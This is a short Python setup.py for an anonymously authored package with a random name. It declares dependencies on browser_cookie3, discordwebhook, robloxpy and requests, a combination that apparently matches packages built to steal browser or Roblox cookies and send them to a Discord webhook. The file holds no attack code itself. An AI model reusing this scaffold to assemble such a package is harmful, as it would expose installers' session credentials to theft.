from setuptools import setup, find_packages
# :)
VERSION = '1.0.0'

# Setting up
setup(
    name='xolohnetekcjdz', 
    author="",
    author_email="",
    packages=find_packages(),
    install_requires=["browser_cookie3", "discordwebhook", "robloxpy", "requests"],
)